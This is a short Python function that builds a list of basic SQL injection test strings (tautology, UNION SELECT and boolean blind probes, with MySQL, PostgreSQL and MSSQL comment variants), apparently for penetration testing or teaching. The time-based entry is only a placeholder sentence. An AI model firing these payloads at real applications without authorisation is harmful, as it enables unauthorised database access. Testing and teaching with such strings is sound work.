def generate_sqli_payloads(db_type):
    payloads = []

    payloads.append("[Error-Based SQL Injection]")
    payloads.append("' OR 1=1 --")

    payloads.append("\n[Union-Based SQL Injection]")
    payloads.append("' UNION SELECT NULL,NULL --")

    payloads.append("\n[Blind SQL Injection - Boolean Based Example]")
    payloads.append("' AND 1=1 --")

    payloads.append("\n[Blind SQL Injection - Time Based Concept]")
    payloads.append("Time delay example varies by DB type")

    if db_type == "mysql":
        payloads.append("\n[MySQL Specific Comment Style]")
        payloads.append("' OR 1=1 #")

    elif db_type == "postgres":
        payloads.append("\n[PostgreSQL Example]")
        payloads.append("' OR TRUE --")

    elif db_type == "mssql":
        payloads.append("\n[MSSQL Example]")
        payloads.append("' OR 1=1;--")

    return payloads